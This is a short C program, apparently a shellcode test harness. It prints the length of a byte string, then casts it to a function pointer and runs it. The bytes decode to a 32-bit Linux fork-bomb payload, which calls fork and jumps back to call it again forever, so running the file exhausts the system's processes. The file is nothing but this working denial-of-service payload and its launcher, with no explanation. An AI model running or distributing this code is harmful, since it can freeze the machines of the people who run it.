#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x40\x40\x50\x58\xcd\x80\xeb\xf6";
 

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
